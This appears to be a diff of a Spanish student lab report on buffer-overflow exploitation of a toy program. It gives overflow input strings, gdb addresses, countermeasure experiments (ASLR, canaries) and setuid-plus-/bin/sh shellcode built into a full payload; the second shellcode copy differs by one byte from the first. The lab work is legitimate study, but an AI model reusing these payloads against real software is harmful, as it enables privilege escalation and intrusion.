@@ -139,6 +139,9 @@ $8 = (char (*)[64]) 0xffffd13c
 $9 = (int (*)()) 0x565562cd <mostrarSecreto2>
 ```
 
+### Pregunta 7.
+#### ¿Qué datos de entrada proporcionas al programa para que opt[s] lea (y luego intente ejecutar) a partir de resp[8]?
+
 resp[0..7] = {...}
 resp[8:12] = 0x565562cd
 
@@ -147,9 +150,89 @@ s = -16
 
 -16aaaaa\xCD\x62\x55\x56
 
-### Pregunta 7.
-#### ¿Qué datos de entrada proporcionas al programa para que opt[s] lea (y luego intente ejecutar) a partir de resp[8]?
+### Pregunta 8.
+#### Hay otra forma de conseguir la escritura del segundo mensaje secreto por pantalla? En caso positivo, explica cómo conseguirlo y motiva los pasos y datos introducidos.
+
+Cadena:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x62\x55\x56
+
+### Contramedidas
+
+#### ASLR
+
+Primera ejecución
+```
+(gdb) b 120
+Breakpoint 1 at 0x565686d1: file cifrado.c, line 120.
+(gdb) continue
+Continuing.
+
+Breakpoint 1, main () at cifrado.c:120
+120				int s = atoi(resp);
+(gdb) p $sp
+$1 = (void *) 0xffe9a0c0
+```
+
+Segunda ejecución
+```
+(gdb) b 120
+Breakpoint 1 at 0x5655f6d1: file cifrado.c, line 120.
+(gdb) continue
+Continuing.
+
+Breakpoint 1, main () at cifrado.c:120
+120				int s = atoi(resp);
+(gdb) p $sp
+$1 = (void *) 0xff806490
+``` 
+
+#### Canarios
+
+```
+[11/23/22]seed@VM:~/.../p4$ while read -r line; do echo -e $line; done | ./cifrado2
+Hola! Menú:
+ 1. Escribir palabra
+ 2. Cifrar
+ 3. Ver palabras
+ 4. Terminar
+1
+Escribe la palabra:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Escribe desplazamiento:
+1
+*** stack smashing detected ***: terminated
+```
+
+#### Pila no ejecutable
+
+84 a's + dirección de secreto 2
+## Parte 4
+
+```c
+"\x31\xdb"                  // xor    %ebx,%ebx
+"\x6a\x17"                  // push   $0x17
+"\x58"                      // pop    %eax
+"\xcd\x80"                  // int    $0x80
+"\xf7\xe3"                  // mul    %ebx
+"\xb0\x0b"                  // mov    $0xb,%al
+"\x31\xc9"                  // xor    %ecx,%ecx
+"\x51"                      // push   %ecx
+"\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
+"\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
+"\x89\xe3"                  // mov    %esp,%ebx
+"\xcd\x80"                  // int    $0x80
+```
+
+```
+(gdb) p &palabra
+$1 = (char (*)[64]) 0xffffd0d8
+```
+
+\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+    
+\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x2b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd8\xd0\xff\xff
 
 ## Conclusiones
+
 
 ## Referencias 
